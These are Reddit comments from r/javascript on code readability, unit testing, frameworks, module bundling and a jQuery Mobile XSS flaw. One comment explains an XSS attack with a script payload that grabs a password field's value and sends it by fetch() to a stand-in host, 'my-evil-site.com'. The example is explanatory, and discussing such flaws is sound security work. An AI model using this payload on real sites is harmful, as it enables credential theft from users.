this won‚Äôt change unless developers demand it. if contributing to OSS is important to a developer, that developer will choose to work for a company that allows‚Äîor even better‚Äîencourages it. source: me, who did just that
grid is great but you have to watch for browser support for various grid features. I still rely on tables a lot for tabular layouts and regret nothing. Sadly no holy grail solution for a fixed table head and scrolling body, with grid or tables. :(
How about making it more readable by making it more semantic? How does this look? Use a Map, which means you only want a lookup, not a blob thing like an object. Map has .has(), which is easier to read Make the lookup the entire function so its testable, and encapsulate the data so its free of side effects. Too bad Map doesn't have a default value (like in ruby), then we could get rid of all of this. function getBackgroundColorCode(name) { const colorCodesMap = new Map(); colorCodesMap.set("blue", "#2196F3"); colorCodesMap.set("green", "#4CAF50"); colorCodesMap.set("orange", "#FF9800"); colorCodesMap.set("pink", "#E91E63"); colorCodesMap.set("default", "#F44336"); if (colorCodesMap.has(name)) { return colorCodesMap.get(name); } else { return colorCodesMap.get("default"); } } // make this a function if you want document.body.style.backgroundColor = getBackgroundColorCode(colorName);
Missing how the SVG goes away or is covered after the background-url transitions in with opacity. Can someone explain how that works?
The only thing more semantic about using a map is the `has()` check vs `object[key]` in the ternary, but if you're concerned with that you can just use `colorCodes.hasOwnProperty(colorName)`. If you were to use a map I'd also declare all the pairs as you create the map, there's no need to repetitively `set()`. The object isn't encapsulated because A) this is an example for readability. B) you would be creating the object every time the function is invoked, which has even worse performance with a map. This isn't really a concern at this scale, but this is a demonstration and encapsulation would have performance implications the larger the object. A map would do well for information you need to iterate or information you constantly need to add/remove. But in these examples I see no strong argument for why a map would be preferential to an object.
Hi /u/cashlessbeef, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Async iterators let you virtualize expensive or extremely large data sets. They can be a really ergonomic way of iterating through something like an array, even though the elements don't actually exist in memory.
Your code blocks don't render at all on mobile. The font is like peach on white
I just updated it so it will at least render white on black if the prism.js syntax highlighter doesn't initialize, but this should only happen if you have JS disabled.
They might be it. It's visible now
Thanks for the heads up.
Yes but WebAssembly is a way to run code on the browser. We need more things like SPA and stuff to replace these fad frameworks. Maybe designed by someone competent and doesn't run like ass
What is spec work?
If only Google created a well maintained and popular products like Angular. Guess we'll never know what that world would be like...
 document.body.style.backgroundColor = colorCodes[colorName] ? colorCodes[colorName] : colorCodes['default']; Can be written as: document.body.style.backgroundColor = colorCodes[colorName] || colorCodes.default; And this: if (gradeAsPercent &gt;= 90) { return "A"; } else if(gradeAsPercent &gt;= 80) { return "B"; // etc } else { return "F" }; Can be written like: if (gradeAsPercent &gt;= 90) { return "A"; } if (gradeAsPercent &gt;= 80) { return "B"; } // etc return "F";
Yes.
&gt;With that being said, I agree, I rarely need iterators. Still, I think async iterators are pretty cool and useful. Personally I see generators as a useful tool for a very limited set of circumstances (circumstances that I haven't run in to) ... but they're absolutely a "good thing (tm)" for those circumstances. It's just too bad that some people see a hammer and start looking for things to hit with it, instead of putting that hamer on the shelf and waiting for a nail.
I use routers to group routes logically. So one router will have all the /auth/ROUTE routes, and then be mounted on /auth.
I understand that you can group things with routers, I'm more confused with why you'd use a router or subApp as middleware, and also the difference between mounting(?) middleware with an array, or without. &amp;#x200B; app.use(mw1, mw2) // array app,use([mw1, mw2])
I'm not sure abiut the array part. But how else would you use a router without mounting it as a middleware?
Shorter code !== better code. Code should be readable first and foremost! There's a point to be made if that legibility is "wordy" but I find the array functions to be quite obtuse. Plus if you need to use different ones for each use-case then you start to get into "I use big words just to confuse others" territory (or should I say realm, or dominion, or domain, or region, or purview...).
Oh, I see. I will need to do some more testing. I wasn't aware routers needed to be used as middleware.
Here are some of my thoughts on the questions you asked... &amp;#x200B; To answer your question about what to test, I have a question for you, "Why do you want to unit test?" If the answer is "for the experience", then it doesn't really matter where you start. If the answer is "to protect from regression bugs", then I would start with the highest risk areas - the places where the business rules are handled or the areas with the most complex logic. If the answer is: "To ensure new code is clean and correct", then use test-driven development and write the tests for code you haven't written yet. In my experience with JavaScript and unit testing it, testing the UI is probably not the most efficient use of your time if you are using a framework like React, Angular or etc. The reason I say this is because most of what you end up testing is actually framework code, that already has been tested. However, that would not be the case if you are using vanilla JavaScript and doing a lot of dynamic UI.
[Test Driven Development](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530/ref=sr_1_1?keywords=tdd&amp;qid=1557273999&amp;s=gateway&amp;sr=8-1) is a good book &amp;#x200B; &gt;Say I have an app with dozens of functions, how do I choose which functions to write tests for, and are there preferred style guides for these tests? Ideally, you would test them all and you would want to write unit tests and integration tests for them. &gt;If it helps I want to begin by testing the front end code, whether it's generated with a framework like React or more bespoke using template strings. How do you conduct "recon" on your code to pick the targets to write tests for first, and how do you choose your testing framework? I've never used bespoke so I can't comment on it but for react I'd recommend [jest](https://github.com/facebook/jest)and [enzyme](https://github.com/airbnb/enzyme). Jest is a testing framework that was created by Facebook (the creators of react). It's not specifically designed for react but it works great with it. Enzyme is a library made by Airbnb specifically for testing react components. Enzyme is designed to work along side Jest. &gt;I know you need as much coverage as possible but since you gotta start somewhere, how do you pick the starting point in your code? The most critical part of your application
Good targets: Code with high number of dependencies; code with a greater level of complexity; code that is dynamic; code that is critical; code that interacts with user input; code with security implications. General test types: success test (does what it‚Äôs meant to); failure tests (behaves as expected when it fails - e.g. error handling); malform tests (handles unexpected/unrelated/edge behaviour). You use packages like Jest or Jasmin for this. They are very intuitive and simple to use. Integration tests, runs all your tests on all your code at once to see if they still all work when you change a given thing. You would use something like CircleCI (free), Travis or Jenkins. Gold master testing (capturing the result of a process, and then comparing future versions of the code add against runs of the same ‚Äúgold master‚Äù (or known good) version of the process, to discover unexpected changes). You also have simulation testing, where you program an automated tool like Selenium to run through every possible user interaction with your site, and spot changes and errors. Finally you have manual testing, where you develop a test plan and iterate over the application to ensure style, behaviour and outputs are all as desired. Overall strategy: as a coder you try to make your code fail proof. As a tester you try your very best to break the code you tried to make full proof. Don‚Äôt write your tests as confirmation of your great work. Write your tests as a fiendishly malicious and sneaky devil. Be your own worst enemy, so that no enemy will be that bad or that idiotic. Write your code to succeed. Write your tests to sabotage.
True the short-circuit evaluation is probably better than the ternary in that case, I'll have to check with some beginners to see if the syntax is easier to understand and if so I'll swap that out. The else's aren't needed because of the early returns, but I wanted be explicit in my examples and the verbiage trap I talked about earlier applies here with each subsequent comparison being an "else this". The early returns are just an escape for the need of an else.
Nice work! Because I was trying to see how your app handled bad input I tried setting my current age older than my target age, and for some reason it calculated that I would reach my goal. I guess this is because of two negative numbers (my earnings, and my age) turning into a positive amount. &amp;#x200B; Specifically I set my age to be \`234\` and transport costs to be $700/month, and everything else was left as-is.
What do you propose then when u run into legacy code with single files containing 30k lines of uncommented and undocumented code?
Thank you all! Really helpful answers, really motivated me :)
That is just unreadable. A map inside a map, into a flat map.
One says he programs in nodejs and the other has "loved" js since 95.. odd statements in the article
First of all, you should just start, because a program without tests, is a shit program that cannot be changed or refactored. Every library has tests, I would just start reading the tests from your favorite librairies and learn. &amp;#x200B; Also, testing is incredibly complex. To write good tests, you need your code to be completely decoupled and learn how to mock dependencies you did not build yourself, which you can't do unless you know JS very intimately. You also need to test the right things so that you don't need to rebuild your tests every time you change a feature, which I think just comes from intuition from doing it a lot. It will take a long time to learn. I took me at least 1000 hours of TDD to become productive with it. But I would never go back. My programs rarely have bugs that take more than 5min to fix because I have good test coverage.
How about little math for the grade problem. On mobile but I something like const index = Math.floor((grade - 50)/10) const clampedIndex = Math.min(Math.max(index, 0), 5) return "FEDCBA"[clampedIndex]
Start focusing more on how the user will face the system and test that. Test the actions a user will perform and guarantee that the output is as expected. From then, go for more detailed testing, like every function, class, etc. Then go for every possible edge case. With the first tier you will at least guarantee that the system works overall after a change, and as you move further, you will have bigger coverage and confidence that future changes won't break anything or else the tests you show it. Tldr: just do it. You'll get better as you go.
&gt; how do I choose which functions to write tests for I don't think you should write tests for your individual functions. If your company doesn't have time for you to write tests, then those tests are a waste of time. If you're confident that those functions are doing the correct thing, then that should be enough to go off of. If they come to you with production problems, that's probably why you have a job. What I would write tests for are integration. I have no idea how it's possible to write a non-trivial application that integrates with other services without having some saved copy of those requests with at least some way of testing the contents of those requests.
work with bigger data :)
You don't need massive SVG inline if you include them as `&lt;object&gt;`.
This answer is good and you should feel good
Having spent some time in functional languages for a bit, I‚Äôve come to agree on that. But it was definitely a weird shift in thinking. I‚Äôm just so used to JavaScript just assuming that the function will get called, in full, no matter what. It doesn‚Äôt help that there are a ton of functions in the standard library that assume that certain arguments are optional, and even encourage you to not provide them if you‚Äôre okay with a certain default behavior of the function. But now I think that‚Äôs weird. It has the unfortunate effect of requiring key arguments (like the data to operate on) to be passed first, which makes partial application super awkward, even if you‚Äôre using some kind of auto-curry function. Callbacks first, data last, that‚Äôs all I‚Äôm saying... but I digress...
Also `some` will "short circuit" the moment you return a truthy value. Depending on what you're doing it may/may not be the better choice to `find`.
Better semantics *alone* is a strong enough argument IMO. Plus the ability to iterate with it should that need arise. I frequently end up refactoring existing code that is object-based, into maps because I often end up with new requirements or features that do require iteration. I've also seen these "map-like-objects" get bastardized into some generic object with random properties that have nothing to do with the map of information that the object was intended to be. This is less likely to happen if it's a proper map type (hence why I say semantics alone are a strong enough argument).
population density and resources near your land , if you type in a specific address youll get a less chance of survival due the population density being smaller
React is a solid foundation for front-end development in its own right. It works beautifully well. Its underlying functional design is extremely rational and minimal, which is nice when you want your libraries to do one thing well and otherwise stay out of your way. The common stack nowadays involves Redux and React Router. Everything else is pretty easy to tack on as needed. It works with just about any combination of libraries out there. And that‚Äôs mostly because React is very careful not to prescribe very much for you. It does one thing super well: making your UI a simple function of your application state. A lot of companies don‚Äôt like having that kind of freedom. Freedom means making critical choices on your own, and making choices means *responsibility* and potentially *blame* if things don‚Äôt go as planned. But nobody will blame you for using Angular‚Äôs built-in tools, even if they aren‚Äôt the best tool for the job. If you run into problems, at least you can rest assured that you were using the officially *samctioned/blessed* stack. Admittedly, Angular is pretty dang great. But I think it‚Äôs not about ‚Äútrends,‚Äù and whether or not to follow them. React is pretty solid, and has been for years. It‚Äôs fundamentally about corporate bureaucracies wanting to outsource the risk of making important choices.
In my experience, unit testing your front-end is pretty darn difficult, and I have yet to see a solution I really love (though there are some approaches that work okay). By contrast, unit testing your back-end, or some utility code that doesn't directly touch the view layer, is a breeze, even enjoyable. So personally, that's where I would start. Either way, try to test behavior and not implementation. For example, say I have a utility module with a few functions it exports. Those exports form an API I want to ensure works correctly. I will test the inputs and outputs of those functions, and I will religiously avoid testing any helper functions or other internal details. Why should I care how it is implemented? All I care about is that the end product works. When you aren't hacking out a new solution, try to get in the habit of writing your tests _first_. They form a sort of statement of intent. You can describe exactly the thing you want to build, what sort of inputs it expects, what it's edge cases are, etc. This is hard to do when you are hacking and you aren't really sure what you are building, but in the times when I know more less which way I'm going, I find it makes implementation much easier to have started with tests. You'll discover pretty quickly that small functions with no side-effects are much easier to unit test than classes or big components. To me, that is a clue about how I would prefer to structure my code. Small unit-tested functions become the rock solid foundation of everything else I build. If all of my big components are composed mostly of smaller unit-tested utility functions, then even if I don't manage to test the big components, there is much less room for error. Imagine future developers will be reading your unit tests like specs. They might be. For libraries, I prefer Mocha/Chai, but they are all more or less the same and the syntax is pretty easy to learn. If it helps, here are some unit tests from a personal project of mine: https://github.com/meeba-farm/meeba-farm/blob/master/tests/app/utils/objects.test.js
Polymorphism is a pretty heavy-handed approach to conditional cleanup. It's great in a lot of cases, but it can also add a lot of complexity to your public or private APIs (whether in the form of polymorphic classes, or functions).
For some specific logic u can use Symbol.iterator and break loop manually
How many of these articles do we really need?
Current client requires 100% coverage on their react apps and I kinda hate it.
I recently heard a talk about a similar concept: basically you should reach for pure HTML until you hit a point where you need things that HTML can‚Äôt provide. Then you should reach for CSS, and avoid JavaScript until you absolutely cannot move on without it, and that will, ideally, take care of most of the site for you. And by then it should be clear what your core JS requirements will be. I think I agree with most of that. I would personally avoid inline styles for HTML, though. That just gets really hairy.
It‚Äôs kind of amazing how much you can get done with just a couple of helper libraries like jQuery or Bootstrap, and little bit of design know-how...
Man, this is why I appreciate functional languages so much. They usually provide compile-time pattern matching, which helps a lot with identifying all possible sources of error propagation.
In what _exact_ scenarios is the XSS vulnerability relevant? The library is modularised (in fact you choose which features you want when you download it) so it seems overkill to remove the while library if the vulnerability exists in some module you're not using. For example, I am using some tap/touch handler stuff, do I throw the baby out with the bath water because of some URL vulnerability somewhere else?
This is so crucial. JS is super easy to write at first. But introduce even a moderate amount of complexity and it quickly spirals into a heap of spaghetti code if you aren‚Äôt highly disciplined. Which is why it‚Äôs often safer just to glue a few battle-tested frameworks together if you want any semblance of maintainability.
TypeScript is a big negative IMO if it's required or shows up in any examples.
Dang, 100%?? The returns diminish so quickly for that last 10%...
Not to take away from the other good answers you got, but... If you‚Äôre just starting out learning to test, it‚Äôs a good idea to start by writing a new, small, class/module with test-driven development. That‚Äôs purely because a new thing that is built simultaneously with tests is the *easiest* kind of thing to test. Learn on something easy, then learn more advanced techniques that let you bring existing things under test.
The attack would look like this: 1. Create a tinyurl link that redirects to e.g., `www.paypal.com/q=&lt;script&gt;document.querySelector('#your-password').addEventListener('focusout', () =&gt; fetch('https://my-evil-site.com', { payload: document.querySelectorAll('#your-password').value }))&lt;/script&gt;`. 2. Tweet that tinyurl link. 3. Victims click the link, the site dutifully inserts the query right into the page. 4. You receive valuable data from the user. Like, imagine if I sent you to `www.google.com?q=&lt;script&gt;exfiltrateKeypresses()&lt;/script&gt;` and google actually *executed* that script...
&gt; how do I choose which functions to write tests for All of them. Start with the simplest ones with no dependencies, and work upwards.
The evidence suggests that the hardest to test 10% is also where most of the value is
I'm wondering, how soon your account will be blocked
It‚Äôs there as long as the page isn‚Äôt refreshed, so using localStorage would probably be a good idea for your code
I like the idea and have heard similar, but I don't know that that's accurate. Can you share the evidence? It all depends on how the thing was built, but why wouldn't we cover the most valuable areas first?
I have a few rules that I follow, maybe they will help. 1. The easiest functions to test are ones where you have predictable input and output. if I had \`const foo = (bar) =&gt; bar + Date.now()\`, that's going to be hard to test because \`[Date.now](https://Date.now)()\` is always changing. Find the functions that have predictable input and output, and test those. It's as simple as \`expect(foo('bar')).toEqual('baz')\`. 2. Test public interfaces. Let's say I have a file, and we'll call it \`expensiveMathCalculation.js\`, and it exports a default \`expensiveMathCalculation()\` function, test that function, and less of the internal functions it may use. Public interfaces tend to last a long time, but internals are more apt to change as you optimize/refactor things. 3. Test for feature requirements. Whether you work for a product company or a consultancy, somewhere there should be a document of what features your application should have. Have tests that specifically check those requirements will go a long way to having trust-worthy and shippable code. 4. Snapshot tests are your friend. Snapshot tests record the last successful value your test returned, and compares all future values against it (until you update the snapshot). This is great for legacy code that has no tests - snapshots don't care about the value as much as caring that the value doesn't change. Snapshots are tempting to use for a lot of functions, but I'd recommend using them sparingly, and eventually removing them 5. Test one thing. The idea of unit tests are testing \_one unit of work\_. Best case scenario is that \_one unit of work\_ is roughly one function, and it has predictable output. 6. Avoid mocking things. Not that mocking is bad, but mocking often doesn't consistently reflect reality. For instance, if I had \`const nowPlusOneMinute = () =&gt; [Date.now](https://Date.now)() + 60000\`, that's not going to be great to test. I could mock \`Date.now\` to be something like \`[Date.now](https://Date.now) = () =&gt; 1\`, but that means you have to manage [Date.now](https://Date.now), and it may not reflect reality. Updating the function to \`const nowPlusOneMinute = (now) =&gt; (now || [Date.now](https://Date.now)()) + 60000\` lets you specify now for tests, but defaults to the current time for the rest of your code. Now your test could be \`const now = [Date.now](https://Date.now)(); expect(nowPlusOneMinute(now)).toBe(now + 60000)\` and it reflects reality still. 7. Don't re-write any legacy code until there are proper tests and you understand the requirements of that code. The number of times I saw a legacy function like \`doFoo\` and though \_oh, only \`bar()\` uses that, I can change it so it does this different thing\_ is the same number of times that it's backfired. There's always some other function that's hard to trace that will depend on a certain behaviour, and it'll come back to bite you. 8. Document meta-programming. If you ever see something like \`const doMagic = foo =&gt; someObject\[foo\]('bar')\`, start a FIXME comment above it, and document as many things as you can find that represent \`foo\`, which will make your life easier when it comes to search and replace. I guess the main idea here is to leave yourself and future developers breadcrumbs if the job is too big to tackle immediately. Keep in mind that untested legacy code is going to be painful. If you're the person that wrote the code originally, or you have access to the original author, maybe it won't be terribly painful, but if you don't have access to the original author, you are in for a real bad time, and it might give you a rather bad impression of testing. When you write code and intend on testing it, you'll find that you write that code thinking \_what's the best and easiest way I could test this\_, but if the previous mentality was just \_we need to ship this yesterday\_, be prepared for the biggest mess of mixed concerns, unnecessary dependencies, and all other sorts of problems. &amp;#x200B; \--- &amp;#x200B; The first step I'd do is write a failing test that imports the main entry file of your project, and run coverage. There are lots of great tools for coverage, I think \`istanbul\` is probably the defacto javascript option. \`jest\` has that mostly preconfigured, so running \`jest --coverage\` will generate a report for you, and will list uncovered lines and other good information; check out the lcov html report with \`npx servor coverage/lcov\_report\` (that path might be slightly wrong), that'll be a great visual to help you figure out what your tests are covering. Keep in mind that code coverage only really knows about the path your code takes, and isn't the best metric of how good your tests are. It's great to get started, though, since you'll want to be able to track roughly what is tested and what is not. &amp;#x200B; I hope that helps, and best of luck!
Someone tell me how to prepare for this: * Deliver SPA to client, minified builds and Typescript source * Client decides to make changes themselves without asking or telling us about it. * Proceeds to un-minify the JS bundle (which includes various 3rd party libs) and prettify it. * Makes some (surprisingly complicated) changes and additions directly to this JS blob. * Then comes back to us with a request to add new features on top of that.
Basically the entire PMBoK
 function g(p) { return 'FFFFFFDCBAA'[p / 10 | 0]; } console.assert(g(0) === 'F'); console.assert(g(59.999) === 'F'); console.assert(g(60) === 'D'); console.assert(g(99) === 'A'); console.assert(g(100) === 'A'); Note: There shouldn't be an E.
I strongly suggest that you skip guides for the beginning and `npm i -D jest` then spend 5 minutes [getting started](https://jestjs.io/docs/en/getting-started). Once it's wired up, run `jest - - watch` and it'll start live reloading when you save a file. Write more tests and watch what happens! I recommend this because it's the fastest way to close the feedback loop. You can read articles and books and never end up actually writing tests or appreciating that it can even be fun. If you just start using a dead-simple testing tool with a watch mode, you can get an immediate understanding and appreciation of the concepts. Beyond diving into jest, I personally found Fun Fun Function's series on test driven development to be a wonderful introductions to the *whys* of testing in a very concrete, relatable way.
What about screen and canvas resolution? It may cause an error
I personally don't like this at all, but leaving that aside you have extremely low chance of this getting into the language. Arrow functions already have various syntax variants and I would be surprised if they added even more just for the sake of writing 3 characters less. That said, the TC39 has already welcomed a bunch of silly stuff I wouldn't have. So... maybe just try and see what happens. They have a repo on github. You should be able to find it at https://github.com/tc39/ I guess.
TLDR?
Have a clause in your contract that specifies how all changes are to be requested.
Martin Fowler recently released a new edition of his highly acclaimed "Refactoring: Improving the design of existing code", with all examples now in javascript.
If your doing some sort of business application, when Donald is correct. However some projects like game event loops have that as core requirement - data driven design. Meaning data, it's volume and structure dictates the arlgorithm. Optimizing for developer productivity might be the wrong approach :). But again, I laregely agree as only a fraction of developers require data driven approach.
Oh man, I really thought you were joking, but the 2nd edition was published sixth months ago! Great tip, thank you!
Don't be lazy.
Link to TOS https://help.github.com/en/articles/github-terms-of-service#7-excessive-bandwidth-use
Is this the guy that understands webpack?
Ha!
Re-write their changes onto the original code.
The tool only uses Github API for image uploading, which was authenticated by user. Don't request the API too ofen, things would be fine.
Original author of the research here. As long as you include the core modules, you're vulnerable. However, if you're only including touch events and not the core of the framework, you should be safe. It's also worth noting, though, that the modular download builder "is still in alpha and should not be used on production websites".
It's a nice overview of the evolution of javascript modules up to today, explaining what they are, why they are needed, how they have been implemented and imported in the past (with pros/cons) and briefly how to use them today with webpack.
hail node 12 \`--experimental-modules
I feel for you. Unless your client is Nasa or a Nuclear facility it sounds like someone just said it as they don't have to do the work. As other people say tests should be on the important areas otherwise you will never be able to get on with anything. Plus what tests your tests are correct. How far do you take it.
Tests are good and they give you a good warm and fuzzy feeling that you haven't totally borked everything. But some of the people I've worked with who use unit tests like a cult have had much bigger bug counts than me because they test pointless easy things that will likely never change and don't test important things (because its harder to do as there is network or hardware interaction). Its just a tool which can be used well or badly.
Thank you kindly! I am going to look into it and I will find a solution to handle bad inputs - I would be more than happy if you could have another look at it when the issue should be resolved! That's if you feel like it, of course. &amp;#x200B; In any case I just want to tell you that I truly appreciate you had the time to review it - thank you again!
Saber is such a glutton. Does this mean that the output is still slim even though it comprises of everything.
Fantastic video, thanks for sharing!
*Cough cough* "In versions &gt; 1.2.1, the web application must also contain a server-side API that reflects back user input as part of an HTTP response of any type. Practically all non-trivial web applications contain at least one such API" I think this works exploiting excluding js framework entirely. I mean if you dont sanitize what you get and show to user thats bad security there period. While i agree is a problem it seems hard to exploit unless there are more pieces failling.
I even avoid jQuery if I can (main problem being understanding what happens "behind the curtain"), and I use Bootstrap only on Web sites. In JS-based mobile apps I use my own stuff.
Content types are the key issue here. The server-side application can return perfectly valid and "safe" JSON content (or plain text, or binary formats, or anything else), but JQM allows an attacker to render it as HTML. Nothing needs to be "failing", and exploiting is not hard, it's trivial.
"Server needs to reflect" as per article that means they didnt sanitize. So you tell me that JQM will show html even if backend sanitize it? Because i highly doubt it.
It doesn't have to be HTML when the server sees it. If it's not HTML, the server can't possibly sanitize it for HTML special characters. It only becomes HTML on the clien-side when an attacker exploits the vulnerability.
Complexity if your going to start on a already written code. There is good tools that can help you find what where to focus. Codescene etc. If your writing new code aim to test all none trivial logic. Do TDD lite, with that I mean write the code create test that covers it. Think of what could go wrong analyse every function you got. I have worked in QA for many years, let me know what kind of project it is and I might give you some better hints where to start.
Wait what? Sanitizing a input that contains html makes it no longer show html. This is true for PHP at least and probably more. There is no way for client side to show html if the input he provided is no longer html. This is what it written in article. That server needs to provide the input back and well the JQM probably does an "append". Didnt dig that much.
Dinner Mifflin is a part of sabr... Saberrr
I can't help but feeling you're intentionally misunderstanding the issue. The server *can* remove everything that looks like HTML from everything it sees, sure, and then there's no problem. But why would it, if what it outputs is not HTML but JSON or even PDF for example? JQM allows an attacker to take that PDF file and render it as HTML on the client-side, when normally that could never happen.
I dont think you can go that far with it. Because simply, server outputs something. When server outputs something it owns that data. That data must be safe. You just dont pressume user is good. Because simply, you can never trust a user. If you dont sanitize the data its a backend fault not a frontend. A unsanitized data can be used anywhere in application and will bring havoc without the need of any exploit. For example an unsanitized no length username. As i said, if there was no server involvement its a framework issue. If there is server and framework its a server issue. But here clearly states the server needs to blindly show harmfull data to the user. This can and will break other frameworks that dont sanitize input data...
So you're saying all servers that host PDF files should strip HTML special characters out of them before allowing downloads?
Hi /u/lewisdbentley, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
You cant xss with this unless you show the script. So you need to show what was sent to you. If you show a pdf file there is no xss.... Logically isnt it?
Exactly. Only, this vulnerability specifically allows an attacker to show a PDF file as if it were HTML. Now you see the problem?
No. Because while it is not unwanted its not a seurity risk. Unless the pdf is literally a html script made to send data is literally not gonna work PHP wise: To download a file i get a request. I send back to the user the file that will download that file. because i am the sender i set the content type, not you. In the worse scenario i give an absolute path. How does this exploit will insert xss anywhere? This attack works if you have holes already and even then you can exploit without jqm. What it actually exploits:"server expects json, gets html, sends it back untouched like the name of the file". Which is bad in itself.
&gt; because i am the sender i set the content type, not you. That's the vulnerability. JQM ignores the content type and renders as HTML anyway. What the server sets doesn't matter.
JQM doesnt matter when i send a file its literally a file you cannot intercept it with javascript unless you want it too. Because you are gonna do a window.location.href() and tadaaa you download file. I am gonna just be blunt about this: Server sends json, JQM renders html... no xss Server sends images, JQM renders broken html... no xss Server sends html, JQM renders html... no xss. Server sends unescaped input potentially dangerous, JQM renders script ... potentially xss. Lets now see which other function does this: .append(), .html(), any double binding in angular, any react component that displays input from user, literally anything that displays unescaped data. See where i am going with this?
Use a block comment `\*comment out what you need to*\`
&gt; JQM doesnt matter when i send a file its literally a file you cannot intercept it with javascript unless you want it too. That's also part of the vulnerability. An attacker can specify what JQM fetches from the server. A "file" is just an HTTP response like any other. When it's fetched by JQM with XHR, it doesn't trigger a download, instead JQM renders it as HTML.
Any reason to do that? Any way to exploit unless, you upload a js file on that server? But at that point i think we can safely assume there are worse things going on.
W3 Schools. https://www.w3schools.com/js/js_exercises.asp
What was wrong with the answers in the other threads?
Thank you, i will check it out :]
There are always worse things going on, but yes, this is trivially exploitable in most apps. It's been successfully exploited against real apps during our appsec engagements. Server-side vulnerabilities are not required, only normal functionality.
Disclosure: I'm the original author of the linked article.
Lol. Let me have some of whatever's in your pipe there.
I have used [https://www.hackerrank.com/](https://www.hackerrank.com/) and its really cool. Got me hooked and learning was much easier because its gamified.
Lovely.
\- There weren't any dependencies managers in js - here is how we could make a bundle... \- We actually want a module for each dependency - here is how we create it... \- Then there are lots of dependencies managers - here is how they work... \- Here is how you can build a module bundler, so that all those dependencies work in any browser... \- But wait, there is already webpack - here is how you can use it and what it can do...
&gt; it comprises of everything the thing is, it doesn't comprise of everything :)
you need to google the real saber XD
X t? Why x and t? It will be easier to change variable: X to bill And T to tip. The code is readable after this.
Changed it and code is still not readable through the console
Can you specify more on what are you trying to do?
Nice. Does the bitwise or take care of negative numbers?
While on holiday, John and his family visit 3 different restaurants. The bills came to ¬£124, ¬£48 and ¬£268. &amp;#x200B; In order to tip the waiter a fair amount, John created a tip calculating function. &amp;#x200B; John's model is to: &amp;#x200B; \+ tip 20% where the bill is &lt; ¬£50 \+ 15% when the bill is between ¬£50 and ¬£200 \+ 10% where the bill is &gt; ¬£200. &amp;#x200B; Ultimately, John would like to have two arrays: &amp;#x200B; 1. Containing all three tips (one for each bill) 2. Containing all three final paid amounts (bill + tip) &amp;#x200B; Summary: We need a function that caluclates thew tips. Then we need two arrays: one to hold just the tips, and the other to hold the total amount paid to each restaurant. &amp;#x200B; Tip: To calculate 20% of a given value, multiply by .2 (which is the same as 20/100) &amp;#x200B; NOTE: Do not use loops for this exercise. The point is to experiment with how you can create arrays and element values. &amp;#x200B; \*/ This is what im trying to answer
Just a heads up the auto mod will be by in a moment to potentially remove this. You should use /r/learnjavascript to ask such a question. You will get a lot better responses there.
Well. Map is actually a loop so this is incorrect based on what is asking. To be completly fair, it sounds simple enough: Make a function for the logic of the tip. Then you call for each bill the function. CalculateTip(124) CalculateTip(48) CalculateTip(268) Put them in array then make it work. I dont understand if you need to use an associatice array but thats on you. Good luck!
Not really tbh. Sorting algorithms for example have more to do with logic than math. But of course, being good at math can always be helpful at some point of your career. But it will never affect your how good you are programming.
It only works with numbers within the [0, 100] interval (a percentage). If you pass it nonsense like a negative value, NaN, Infinity, or the taste of garlic naan bread in the morning, you get undefined behavior, which in this case is either an `"F"`, `"A"` or `undefined`. The `| 0` thing is a way to do truncation for values which fit into signed 32-bit integers. For what it's worth, in the real world, you'd have to do this with 4 ifs or an array and a loop since the threshold values won't be neither this convenient nor set in stone.
what evidence? under what cases is the hardest 10% the most valuable? (login forms, for example, are pretty easy and the value they provide is easy to get). how does the 'evidence' (what evidence) define value and hard? the brush needed to paint that broad of a stroke must be enormous
I wonder if this change will be accompanied by a removal of ie11 as a standalone browser
`MapReduce` `!==` `.map()` &amp; `.reduce()` `MapReduce` is a programming model/framework for BigData‚Ñ¢Ô∏è processing. It was named after the two popular functions, and conceptually does the same thing, however the whole point of `MapReduce` is that it offers fault-tolerance/scalability through distributing the mapping across several processes/nodes and then being able to then partition the results based on the new mapped values across more processes (how the data is partitioned is a fairly key component, but I won‚Äôt get into the details here for brevity), the results of all the reduced processes are the eventually combined into one single result. This is likely literally only beneficial to you if you are processing terabytes (or petabytes), and have several high end servers to run it on. From the [wikipedia article](https://en.wikipedia.org/wiki/MapReduce): &gt; The key contributions of the MapReduce framework are not the actual map and reduce functions, but the scalability and fault-tolerance achieved for a variety of applications by optimizing the execution engine. As such, a single-threaded implementation of MapReduce will usually not be faster than a traditional (non-MapReduce) implementation; any gains are usually only seen with multi-threaded implementations on multi-processor hardware. However, the actual `.map().reduce()` functions could be beneficial to you, as what you have is essentially the *‚ÄùPoor-man‚Äôs map reduce*, which means you‚Äôre accomplishing the same thing, but in a mutable way via `.forEach` and modifying an object created outside the loop to collect the data. So, the functions could clean up your code and get rid of some nasty old mutable values: tweets .map(tweet =&gt; tweet.split(‚Äú‚Äù)) .flat() .reduce((counts, letter) =&gt; { const n = counts[letter] || 0 return { ...counts, [letter]: n++, }; }, {}); Which does the same thing, but in a functional way, which is considered cooler (by some) at least. So, unless you‚Äôre processing Google levels of data, have a shitload of money to throw at servers, and absolutely need the fault-tolerance/scalability, the answer is no you absolutely don‚Äôt need `MapReduce`. But, `.map().reduce()` on the otherhand can be very helpful.
Code help questions are prohibited, so the incidence of posting code inline is already low. Beyond that, we really don't have the manpower or tools to enforce it.
